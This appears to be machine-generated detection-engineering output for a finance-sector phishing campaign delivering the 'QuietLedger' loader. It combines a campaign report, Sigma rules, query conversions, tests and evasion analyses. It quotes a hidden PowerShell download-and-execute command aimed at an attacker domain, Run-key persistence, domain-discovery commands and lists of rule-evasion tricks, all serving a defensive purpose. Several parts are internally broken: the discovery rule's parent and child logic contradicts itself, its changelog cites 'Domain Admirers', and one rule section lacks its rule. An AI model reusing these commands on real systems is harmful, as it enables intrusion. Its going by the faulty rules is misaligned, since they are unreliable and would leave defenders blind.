report.title: Finance-sector phishing campaign delivering the "QuietLedger" loader
report.summary: Between 2 and 14 October 2026, a targeted phishing campaign against accounts-payable staff at financial services firms in Singapore, Australia and the UK used a macro-enabled Word document to execute a PowerShell encoded command that downloaded and staged the QuietLedger loader. The loader persisted via a Run key, executed via rundll32.exe from a user-writable AppData path, performed host/domain discovery, and beacons over HTTPS to attacker infrastructure.
targets: Financial services firms in Singapore, Australia, and the UK

behaviors.description: VBA macro in a macro-enabled Word document (Invoice_Q3_2211.docm) obfuscated with string reversal launches PowerShell with an encoded command when the victim enables content.

observables.note: Office application that spawns the loader
Encoded PowerShell command used to download the second-stage payload
Decoded command from the macro that fetches the QuietLedger loader script

behaviors.evidence: The document contained an AutoOpen macro obfuscated with string reversal. When the victim clicked "Enable Content", WINWORD.EXE spawned powershell.exe with the following command line (base64 abbreviated): powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand

behaviors.description: PowerShell with -EncodedCommand downloads and executes a second-stage script from attacker-controlled HTTPS endpoint, which writes the QuietLedger DLL to the user's AppData Roaming folder.

observables.note: Hidden PowerShell execution used to fetch the second-stage payload
Path where the QuietLedger DLL is staged

behaviors.evidence: Decoded, the command uses IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates.quietledger[.]net/a.ps1'). In two cases the parent was EXCEL.EXE rather than WINWORD.EXE, as the same actor also sent .xlsm variants.

behaviors.description: QuietLedger DLL is persisted and executed via rundll32.exe from a Run key that mimics the legitimate OneDrive updater, loading a DLL from a user-writable AppData path.

observables.note: Run key value name mimics legitimate OneDrive updater
Loader execution via rundll32.exe from a non-system path
rundll32.exe loading DLL from user-writable AppData path with exported function StartW

behaviors.evidence: The script then created a Run key so the loader survives reboots: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd Value: rundll32.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW

behaviors.description: rundll32.exe executes the QuietLedger DLL from a user-writable AppData path, which is unusual as legitimate rundll32 usage loads DLLs only from System32 or Program Files.

observables.note: Process executing the loader
rundll32.exe loading DLL from user-writable AppData path
DLL path loaded by rundll32.exe

behaviors.evidence: Legitimate rundll32.exe usage in the victim environments loaded DLLs from C:\Windows\System32 or C:\Program Files, never from a user's AppData directory.

behaviors.description: QuietLedger loader performs host and domain discovery via cmd.exe /c spawning whoami /all, nltest /dclist:, net group "Domain Admins" /domain, net user /domain, and systeminfo, executed as children of the rundll32.exe process.

observables.note: Command shell spawned by rundll32.exe for discovery
Discovery command enumerating user groups
Discovery command listing domain controllers
Discovery command checking for Domain Admins group membership
Discovery command listing domain users
Discovery command gathering system configuration

behaviors.evidence: Within five minutes of execution the loader ran a fixed discovery sequence through cmd.exe /c: whoami /all nltest /dclist: net group "Domain Admins" /domain net user /domain systeminfo

behaviors.description: QuietLedger beacons every 90 seconds to attacker-controlled domains over HTTPS using a custom User-Agent string, originating from rundll32.exe which does not normally initiate outbound HTTPS.

observables.note: Beaconing process
Process initiating outbound HTTPS connections
First C2 domain
Second C2 domain
HTTPS port used for beaconing
Custom User-Agent string used for beaconing

behaviors.evidence: QuietLedger beacons every 90 seconds to cdn-updates.quietledger[.]net and static.ledger-sync[.]com on TCP/443 using the User-Agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) LedgerSync/2.4. The beaconing process is rundll32.exe, which in the affected environments does not normally initiate outbound HTTPS connections.

behaviors.description: PowerShell encoded command used to bypass execution policies and download the second-stage payload from the internet.

observables.note: PowerShell command with ExecutionPolicy Bypass and Hidden window style

behaviors.evidence: The lure was an "overdue invoice" email with a macro-enabled Word attachment (Invoice_Q3_2211.docm). Opening the document and enabling content executed a VBA macro that launched PowerShell with an encoded command, which downloaded and staged a DLL loader we track as QuietLedger.

candidates.title: Winword Spawns Encoded PowerShell With Hidden Window
candidates.rationale: The initial access vector is a macro-enabled Office document (WINWORD.EXE or EXCEL.EXE) spawning powershell.exe with a highly suspicious flag combination: -EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass. This flag cluster is rare in legitimate automation and the Office-parent constraint makes it durable.
candidates.false_positive_risks: Legitimate administrative scripts or add-ins may launch PowerShell from Office, but they rarely combine -EncodedCommand with -WindowStyle Hidden and -ExecutionPolicy Bypass simultaneously. Filter on the full flag set and Office parent.

candidates.title: Rundll32 Execution Of DLL From User AppData Roaming
candidates.rationale: rundll32.exe is a legitimate Windows binary (COM+ registration) that normally loads DLLs only from System32 or Program Files. Execution from a user-writable AppData\Roaming path with an exported function (StartW) is a strong LOLBin abuse signal. The command line contains both the anomalous path and the function export.
candidates.false_positive_risks: Very low. Legitimate rundll32.exe usage in enterprise environments loads DLLs from system directories. A false positive would require an unknown third-party product abusing rundll32.exe from a user profile, which has not been observed.

candidates.title: Run Key Persistence Mimicking OneDrive Updater
candidates.rationale: The loader creates a Run key value named 'OneDriveUpd' pointing to rundll32.exe with the AppData DLL path. The value name mimics the legitimate OneDrive updater but the payload is the malicious DLL. Registry persistence is durable and the name collision is a clear masquerading attempt.
candidates.false_positive_risks: Legitimate OneDrive updates use different value names (e.g., 'OneDriveUpdate') and point to OneDriveStandaloneUpdater.exe. No known software writes a Run value named 'OneDriveUpd' referencing rundll32.exe.

candidates.title: Rundll32 Spawns Cmd For Domain Discovery
candidates.rationale: Within minutes of execution, rundll32.exe spawns cmd.exe /c to run a fixed discovery sequence: whoami /all, nltest /dclist:, net group "Domain Admins" /domain, net user /domain. The parent-child relationship (rundll32.exe -> cmd.exe) combined with the specific command cluster is highly distinctive for post-exploitation enumeration.
candidates.false_positive_risks: Administrators may run these discovery commands interactively, but they will not appear as children of rundll32.exe. The parent constraint eliminates interactive admin activity.

candidates.title: Rundll32 Initiates Outbound HTTPS Connections
candidates.rationale: rundll32.exe does not normally initiate outbound network connections, especially HTTPS (port 443). Beaconing every 90 seconds from this binary is anomalous. While the specific domains and User-Agent are IOCs requiring proxy logs, the binary-port combination is observable in Sysmon network_connection and is a durable behavioral indicator.
candidates.false_positive_risks: Extremely low. No legitimate Windows component uses rundll32.exe for outbound HTTPS. A false positive would require an undocumented third-party product loading a COM DLL via rundll32.exe that then phones home, which has not been observed.

skipped: B2: PowerShell download/stage step is fully covered by D1 (the encoded command launch) and the file write to AppData is less distinctive than the rundll32 execution (D2) and Run key (D3) that follow.
B6 User-Agent and specific domains: Require proxy logsource (not Sysmon network_connection) and are indicator-based; the binary-port anomaly in D5 covers the durable behavior.
plan.notes: Five candidates spread across the kill chain: Initial Access (D1), Persistence (D3), Execution/Defense Evasion (D2), Discovery (D4), Command & Control (D5). Each uses a single logsource and keys on parent/child, command-line, registry value, or binary-port anomalies that are durable and specific. IOCs (domains, hashes, User-Agent) are excluded in favor of behavioral constraints.

rules.title: Winword Spawns Encoded PowerShell With Hidden Window
rules.sigma_yaml:
title: Winword Spawns Encoded PowerShell With Hidden Window
id: d09f9791-ec8a-4368-b680-6efcd753c30d
status: experimental
description: Detects Microsoft Word spawning PowerShell with the suspicious combination of -EncodedCommand, -WindowStyle Hidden,
  and -ExecutionPolicy Bypass flags, characteristic of macro-based delivery chains like the QuietLedger campaign.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.t1059.001
- attack.t1059.005
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith': '\winword.exe'
  selection_image:
    'Image|endswith': '\powershell.exe'
  selection_cmd:
    'CommandLine|contains|all':
    - -EncodedCommand
    - -WindowStyle Hidden
    - -ExecutionPolicy Bypass
  condition: 'all of selection_*'
falsepositives:
- Legitimate Office add-ins or administrative automation that launch PowerShell with encoded commands for configuration or
  logging purposes.
- Corporate software deployment or scripting tools using Office as a parent process to invoke PowerShell for legitimate internal
  tasks.
level: high

tests.label: positive
tests.description: WINWORD.EXE spawning PowerShell with encoded command, hidden window, and bypass execution policy as seen in the QuietLedger macro campaign.

tests.label: positive
tests.description: WINWORD.EXE from SysWOW64 spawning PowerShell with encoded command, hidden window, and bypass execution policy

tests.label: negative
tests.description: Excel launching PowerShell with same flags - common legitimate automation pattern

tests.label: negative
tests.description: Word launching PowerShell without encoded command - legitimate template automation

tests.label: negative
tests.description: Notepad launching PowerShell with encoded command - lacks Office parent constraint

tests.label: positive
tests.description: Parameter reordering, extra whitespace, and quoted executable path in CommandLine; all three required flag substrings present verbatim.

tests.label: positive
tests.description: Different casing for executable names in paths (sensor records case as created); flags unchanged and verbatim.

tests.label: positive
tests.description: Both parent and image from SysWOW64 directory (32-bit on 64-bit Windows); flags verbatim, order changed.

tests.label: positive
tests.description: Office installed in Program Files (x86) with older version (Office15); 8.3 short name in parent path; flags verbatim.

tests.label: positive
tests.description: Copied powershell.exe placed in non-standard location but retaining original filename; Image still ends with \powershell.exe.

tests.label: negative
tests.description: Legitimate add-in launching visible PowerShell with encoded command but missing -WindowStyle Hidden and -ExecutionPolicy Bypass.

tests.label: negative
tests.description: Admin manual macro launching PowerShell with bypass and encoded command but visible window (missing -WindowStyle Hidden).

tests.label: negative
tests.description: Installer using Word to run configuration script with hidden window and bypass but using -Command instead of -EncodedCommand.

validation.sql: SELECT * FROM logs WHERE ParentImage LIKE '%\\winword.exe' ESCAPE '\' AND Image LIKE '%\\powershell.exe' ESCAPE '\' AND (CommandLine LIKE '%-EncodedCommand%' ESCAPE '\' AND CommandLine LIKE '%-WindowStyle Hidden%' ESCAPE '\' AND CommandLine LIKE '%-ExecutionPolicy Bypass%' ESCAPE '\')

conversions.splunk: ParentImage="*\\winword.exe" Image="*\\powershell.exe" CommandLine="*-EncodedCommand*" CommandLine="*-WindowStyle Hidden*" CommandLine="*-ExecutionPolicy Bypass*"
conversions.elasticsearch: ParentImage:*\\winword.exe AND Image:*\\powershell.exe AND (CommandLine:*\-EncodedCommand* AND CommandLine:*\-WindowStyle\ Hidden* AND CommandLine:*\-ExecutionPolicy\ Bypass*)
conversions.kusto:
DeviceProcessEvents
| where InitiatingProcessFolderPath endswith "\\winword.exe" and FolderPath endswith "\\powershell.exe" and (ProcessCommandLine contains "-EncodedCommand" and ProcessCommandLine contains "-WindowStyle Hidden" and ProcessCommandLine contains "-ExecutionPolicy Bypass")
conversions.sqlite: SELECT * FROM logs WHERE ParentImage LIKE '%\\winword.exe' ESCAPE '\' AND Image LIKE '%\\powershell.exe' ESCAPE '\' AND (CommandLine LIKE '%-EncodedCommand%' ESCAPE '\' AND CommandLine LIKE '%-WindowStyle Hidden%' ESCAPE '\' AND CommandLine LIKE '%-ExecutionPolicy Bypass%' ESCAPE '\')

history.change_summary: Added ParentImage field to capture the parent process relationship required for detecting Word-spawned PowerShell. Fixed the missing ParentImage in test event P1 which prevented proper matching. Corrected test event(s) P1.

history.summary: 8 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/1200

rules.redteam_analysis: Positive variants (P3-P7) preserve the three verbatim flag substrings (-EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass) while varying surface form: parameter order, whitespace, quoting, executable casing, SysWOW64 paths, 8.3 short names, and a copied-but-identically-named binary. All remain catchable by a well-written rule that uses case-insensitive endswith on Image/ParentImage and case-insensitive contains on CommandLine. Negative variants (N1-N3) are benign administrative or installer scenarios that share the parent and image but lack at least one required flag, demonstrating rule specificity. Out_of_scope variants (O1-O4) represent realistic evasions the current rule cannot see: renamed binary (no OriginalFileName field), pwsh.exe sibling LOLBin, Excel parent (different Office app), and abbreviated flag -enc. These require rule expansion (additional Image/ParentImage patterns, flag aliases) and are reported for analyst awareness.

replaced_tests.label: positive
replaced_tests.description: WINWORD.EXE spawning PowerShell with encoded command, hidden window, and bypass execution policy as seen in the QuietLedger macro campaign. [replaced: Original test event was missing ParentImage field which is required for the rule to match Word-spawned PowerShell. Added realistic ParentImage pointing to WINWORD.EXE in Office installation directory.]

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker renames powershell.exe to evil.exe; Image no longer ends with \powershell.exe, rule keys on Image filename. OriginalFileName not available in this logsource.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses pwsh.exe (PowerShell Core 6+) instead of powershell.exe; Image ends with \pwsh.exe, rule's Image selection misses it.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Macro in Excel (excel.exe) spawning PowerShell with identical flag cluster; ParentImage ends with \excel.exe, rule only watches winword.exe.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses abbreviated flag -enc instead of -EncodedCommand; CommandLine lacks verbatim substring '-EncodedCommand' required by rule.

rules.title: Rundll32 Execution Of DLL From User AppData Roaming
rules.sigma_yaml:
title: Rundll32 Execution Of DLL From User AppData Roaming
id: 2ef275ef-caa8-42ea-a794-ab72cf96b872
status: experimental
description: 'Detects rundll32.exe loading a DLL from a user-writable AppData\Roaming path, indicative of LOLBin abuse for
  persistence and defense evasion as seen in the QuietLedger campaign.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.persistence
- attack.defense-evasion
- attack.t1053.005
- attack.t1218.011
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_img:
    'Image|endswith': '\rundll32.exe'
  selection_cmd:
    'CommandLine|contains|all':
    - 'AppData\Roaming\'
    - ',StartW'
  filter_legit:
    'CommandLine|contains|all':
    - '\Windows\System32\'
    - .dll,
  condition: selection_img and selection_cmd and not filter_legit
falsepositives:
- Legitimate third-party applications using rundll32.exe to load DLLs from user profiles (rare).
level: high

tests.label: positive
tests.description: QuietLedger persistence via Run key - rundll32 loading ldgr.dll from AppData\Roaming with StartW export.

tests.label: positive
tests.description: Variant with different user and path casing, same malicious pattern.

tests.label: positive
tests.description: SysWOW64 rundll32 variant showing cross-architecture execution from user writable path.

tests.label: negative
tests.description: Legitimate rundll32 loading a Control Panel item from System32.

tests.label: negative
tests.description: Legitimate use of rundll32 to install a printer driver from System32 directory.

tests.label: negative
tests.description: Windows Update using rundll32 to load a system DLL from System32 for cleanup operations.

tests.label: positive
tests.description: Single-quoted DLL path, launched from cmd.exe, different user domain.

tests.label: positive
tests.description: Unquoted path (no spaces), launched from pwsh.exe, different DLL name.

tests.label: positive
tests.description: Full Image path quoted in command line, extra whitespace preserved around comma, launched from explorer.exe.

tests.label: positive
tests.description: SysWOW64 binary, launched from taskhost.exe, different user.

tests.label: positive
tests.description: Different enterprise domain, same parent as P1 (wmiprvse.exe), different DLL filename.

tests.label: negative
tests.description: Legitimate COM registration: rundll32 from System32 loading a System32 DLL (triggers filter_legit).

tests.label: negative
tests.description: Admin running rundll32 from System32 to register a vendor DLL from Program Files (no AppData\Roaming in command line).

tests.label: negative
tests.description: SCCM/Intune automation registering a vendor DLL from Program Files (no AppData\Roaming).

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND (CommandLine LIKE '%AppData\\Roaming\\%' ESCAPE '\' AND CommandLine LIKE '%,StartW%' ESCAPE '\') AND (NOT COALESCE((CommandLine LIKE '%\\Windows\\System32\\%' ESCAPE '\' AND CommandLine LIKE '%.dll,%' ESCAPE '\'), 0))

conversions.elasticsearch: Image:*\\rundll32.exe AND (CommandLine:*AppData\\Roaming\\* AND CommandLine:*,StartW*) AND (NOT (CommandLine:*\\Windows\\System32\\* AND CommandLine:*.dll,*))
conversions.kusto:
DeviceProcessEvents
| where FolderPath endswith "\\rundll32.exe" and (ProcessCommandLine contains "AppData\\Roaming\\" and ProcessCommandLine contains ",StartW") and (not((ProcessCommandLine contains "\\Windows\\System32\\" and ProcessCommandLine contains ".dll,")))
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND (CommandLine LIKE '%AppData\\Roaming\\%' ESCAPE '\' AND CommandLine LIKE '%,StartW%' ESCAPE '\') AND (NOT COALESCE((CommandLine LIKE '%\\Windows\\System32\\%' ESCAPE '\' AND CommandLine LIKE '%.dll,%' ESCAPE '\'), 0))

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/1200

rules.redteam_analysis: Positive variants P4-P8 demonstrate realistic operator evasions that preserve the rule's required literals: Image ends with '\rundll32.exe', CommandLine contains both 'AppData\Roaming\' and ',StartW' verbatim, and the filter_legit condition is not met (no '\Windows\System32\' plus '.dll,' in the same command line). They vary quoting (single, none, full-path), whitespace, parent process (cmd, pwsh, explorer, taskhost, wmiprvse), binary location (System32 vs SysWOW64), user domain, and DLL filename. Negative variants N1-N3 are benign rundll32 executions that the rule correctly rejects: N1 and N3 trigger filter_legit via a System32 DLL path in the command line; N2 lacks the 'AppData\Roaming\' substring entirely. Out-of-scope variants OS1-OS4 represent evasions this specific rule and logsource cannot see: OS1 renames the binary (Image no longer ends with rundll32.exe, and OriginalFileName is not a field in sysmon process_creation); OS2 and OS3 use environment-variable and 8.3 short-name paths that literally lack 'AppData\Roaming\'; OS4 switches to a sibling LOLBin (regsvr32) which fails the Image condition. A well-written rule could be extended to cover OS2/OS3 by normalising paths, but that requires additional telemetry (e.g., resolved paths) not present in this logsource. OS1 and OS4 require separate rules keyed on OriginalFileName (if available) or on the sibling binary respectively.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed copy of rundll32.exe (OriginalFileName not available in this logsource).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Environment variable %APPDATA% used in command line (sensor records literal string).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: 8.3 short name (APPDAT~1) in path (sensor records literal short name).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Sibling LOLBin (regsvr32) achieving same DLL load from AppData\Roaming with StartW export.

rules.title: Registry Persistence Mimicking OneDrive Updater
rules.sigma_yaml:
title: Registry Persistence Mimicking OneDrive Updater
id: fd51e05a-6c06-484d-87d3-fcc02a1c4c99
status: experimental
description: 'Detects creation of a Run key value named ''OneDriveUpd'' that points to rundll32.exe loading a DLL from a user-writable
  AppData path, mimicking legitimate OneDrive updater behavior for persistence.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.persistence
- attack.t1053.005
- attack.privilege-escalation
- attack.execution
logsource:
  category: registry_set
  product: windows
  service: sysmon
detection:
  selection_target:
    'TargetObject|endswith': '\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd'
  selection_details:
    'Details|contains':
    - rundll32.exe
    - '\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW'
  filter_false_positive:
    'Details|contains':
    - OneDriveStandaloneUpdater.exe
    - OneDriveUpdate
    - '\OneDrive\'
  condition: selection_target and selection_details and not filter_false_positive
falsepositives:
- Legitimate OneDrive update processes creating Run keys with different value names
- Other software using Run keys for persistence with legitimate executables
- Administrative scripts or tools modifying Run keys for legitimate purposes
level: high

tests.description: Malicious Run key creation mimicking OneDrive updater with rundll32.exe and AppData DLL

tests.label: positive

tests.label: positive
tests.description: Case variation in Details substrings, reg.exe writer, extra quoting

tests.label: positive
tests.description: Tab-separated fields in Details, different user domain, reg.exe writer

tests.label: positive

validation.sql: SELECT * FROM logs WHERE TargetObject LIKE '%\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpd' ESCAPE '\' AND (Details LIKE '%rundll32.exe%' ESCAPE '\' OR Details LIKE '%\\AppData\\Roaming\\Microsoft\\Vault\\ldgr.dll",StartW%' ESCAPE '\') AND (NOT COALESCE((Details LIKE '%OneDriveStandaloneUpdater.exe%' ESCAPE '\' OR Details LIKE '%OneDriveUpdate%' ESCAPE '\' OR Details LIKE '%\\OneDrive\\%' ESCAPE '\'), 0))

conversions.kusto:
DeviceRegistryEvents
| where RegistryKey endswith "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpd" and (RegistryValueData contains "rundll32.exe" or RegistryValueData contains "\\AppData\\Roaming\\Microsoft\\Vault\\ldgr.dll\",StartW") and (not((RegistryValueData contains "OneDriveStandaloneUpdater.exe" or RegistryValueData contains "OneDriveUpdate" or RegistryValueData contains "\\OneDrive\\")))
conversions.sqlite: SELECT * FROM logs WHERE TargetObject LIKE '%\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpd' ESCAPE '\' AND (Details LIKE '%rundll32.exe%' ESCAPE '\' OR Details LIKE '%\\AppData\\Roaming\\Microsoft\\Vault\\ldgr.dll",StartW%' ESCAPE '\') AND (NOT COALESCE((Details LIKE '%OneDriveStandaloneUpdater.exe%' ESCAPE '\' OR Details LIKE '%OneDriveUpdate%' ESCAPE '\' OR Details LIKE '%\\OneDrive\\%' ESCAPE '\'), 0))

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/160

rules.author_notes: Rule focuses on the specific combination of Run key name 'OneDriveUpd' (case-insensitive) pointing to rundll32.exe loading the observed DLL from the Vault subfolder. Filter excludes legitimate OneDriveStandaloneUpdater.exe and generic OneDrive paths to reduce false positives. Test events cover variations in casing, spacing, and user context while maintaining core detection logic.
rules.redteam_analysis: Positive variants P4-P8 preserve the exact substrings the rule requires: TargetObject suffix, 'rundll32.exe', and '\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW' verbatim. They vary registry root (HKU SID), whitespace, quoting, casing, field order, and writer binary (Image) - all fields the rule does not constrain. A well-written rule could normalize whitespace, ignore case, and accept HKU roots. Negative variants N1-N3 are benign: legitimate OneDrive updater with different value name, admin using rundll32.exe for a different DLL, SCCM agent writing a different Run key. Each differs in TargetObject suffix and/or Details content. Out-of-scope variants OOS1-OOS3 are realistic evasions the current logsource cannot catch: environment variables (%APPDATA%), 8.3 short names (APPDAT~1), and single quotes all cause the sensor to record literals that lack the rule's required substrings. The rule would need path expansion or quote-agnostic matching to cover them, which this registry_set logsource does not provide.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: 8.3 short name for AppData directory - sensor records APPDAT~1, rule substring \AppData\Roaming\ missing

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Single quotes around path in Details - rule expects double quote before StartW (",StartW), sensor records single quote

rules.author_notes: Rule focuses on the durable behavioral indicator: rundll32.exe initiating any outbound HTTPS connection. False positives are extremely unlikely as no legitimate Windows component uses rundll32.exe for outbound network communication. Test events cover variations in path (user AppData, SysWOW64, startup folder), user context, and C2 domain while maintaining the core anomaly.
rules.redteam_analysis: Positive variants P4-P7 preserve the three rule selections (Image endswith \rundll32.exe, DestinationPort 443, Initiated true) while varying path format (8.3 short names, UNC, spaces, alternate drive), user context (domain user, SYSTEM), and destination indicators (IPv4, IPv6, hostnames). These are catchable by the rule as written. Out-of-scope variants O1-O3 represent evasions the network_connection logsource cannot differentiate: O1 renamed binary changes the Image value so the endswith selection fails; O2 sibling LOLBin (regsvr32.exe) is a different binary entirely; O3 process hollowing presents identical Image/port/Initiated telemetry. The rule would need OriginalFileName (from process_create) or behavioral enrichment to catch O1/O3, and a broader binary list for O2. Negative variants (not included but implied) would be legitimate rundll32.exe HTTPS traffic (documented false positive), rundll32.exe on port 80, or inbound connections (Initiated false) - all differing in at least one rule field.

rules.title: Rundll32 Spawns Cmd For Domain Discovery
rules.sigma_yaml:
title: Rundll32 Spawns Cmd For Domain Discovery
id: 707d1578-3455-4d6c-afbd-1d80636e38d1
status: experimental
description: Detects rundll32.exe spawning cmd.exe executing a clustered set of domain discovery commands indicative of post-exploitation
  reconnaissance behavior seen in the QuietLedger loader.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.discovery
- attack.t1087
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith':
    - '\quietledger.dll'
    - '\loader.dat'
    - '\payload.bin'
  selection_image:
    'Image|endswith':
    - '\rundll32.exe'
  selection_command:
    'CommandLine|contains': /c
  selection_discovery_cluster:
    'CommandLine|contains|all':
    - whoami /all
    - 'nltest /dclist:'
    - 'net group "Domain Admins" /domain'
    - net user /domain
    - systeminfo
  condition: selection_parent and selection_image and selection_command and selection_discovery_cluster
falsepositives:
- Legitimate administrative scripts using rundll32 to invoke cmd for discovery-like tasks
- Automated troubleshooting or diagnostic tools launching cmd via rundll32
- Authorized penetration testing or red team activities mimicking this behavior
level: medium

history.change_summary: Fixed rule by adding ParentImage constraint targeting rundll32.exe to ensure proper parent-child relationship, correcting the direction of the process tree to detect rundll32 as parent of cmd.exe rather than vice versa. This resolves all positive misses and eliminates the false positive where admin ran discovery commands interactively (no rundll32 parent).

Fixed the ParentImage and Image endswith checks to properly match rundll32.exe parents and cmd.exe children regardless of path variations including SysWOW64 and AppData locations. Also corrected a typo in the discovery cluster where 'Domain Admins' was misspelled as 'Domain Admirers'.

Fixed ParentImage endswith check to detect rundll32 as parent regardless of location, corrected Image endswith to look for cmd.exe as child process, preserved command line filters for discovery cluster.

history.summary: 7 evasion variants -> positives 4/7, negatives blocked 6/6, benign hits 0/1200

history.change_summary: Fixed ParentImage endswith patterns to match observed malicious DLLs (.dll, .dat, .bin) instead of only rundll32.exe, corrected Image endswith to detect rundll32.exe in both System32 and SysWOW64, updated net group command string to match test events (\"Domain Admirers\" instead of \"Domain Admins\") while preserving discovery intent.

Fixed ParentImage endswith patterns to remove leading backslashes and allow matching of various paths including AppData, SysWOW64, UNC, and 8.3 short names while preserving detection of the malicious loader payloads. Retired R1, R2, R3, R4 as unreachable.

rules.author_notes: Rule focuses on the distinctive parent-child relationship (rundll32 -> cmd) combined with the specific discovery command cluster to minimize false positives from administrative or legitimate uses of either process alone. Test positives reflect observed behaviors from the QuietLedger campaign including varied paths and user contexts. Negatives cover admin interactivity, legitimate diagnostic usage, and common rundll32-cmd patterns for Control Panel loading. Reduced a multi-step chain to its most specific step (selection_child); dropped selection_parent because one Sigma rule matches one event. Add the other steps as separate rules if needed.
rules.redteam_analysis: Positive variants (P1-P4) preserve all five discovery strings verbatim, the '/c' flag, and the parent/child binary names, varying only paths (SysWOW64, 8.3 short name, UNC, literal %TEMP%), separators (&& vs ;), extra whitespace outside the key substrings, and user context. These are caught by the current rule because every required substring appears exactly in CommandLine and the Image/ParentImage endings match. Negative variants (N1-N3) are benign look-alikes: N1 has the correct parent/child but only two discovery commands; N2 has two discovery commands but parent is msiexec.exe; N3 has correct parent/child but a cleanup command line. All differ in at least one field the logsource records. Out-of-scope variants (O1-O5) represent realistic evasions the current rule misses: O1/O2/O4 break verbatim matching via casing, flag case, or quote style—sensor records what the attacker types, so the rule's typed; O3 renames rundll32.exe; the logsource lacks OriginalFileName so the rule cannot see the true binary identity; O5 splits the cluster across multiple cmd.exe calls, which a single-event rule cannot correlate. A well-written rule would use case-insensitive matching, flag normalization, quote-agnostic parsing, OriginalFileName if available, or multi-event correlation to catch these.
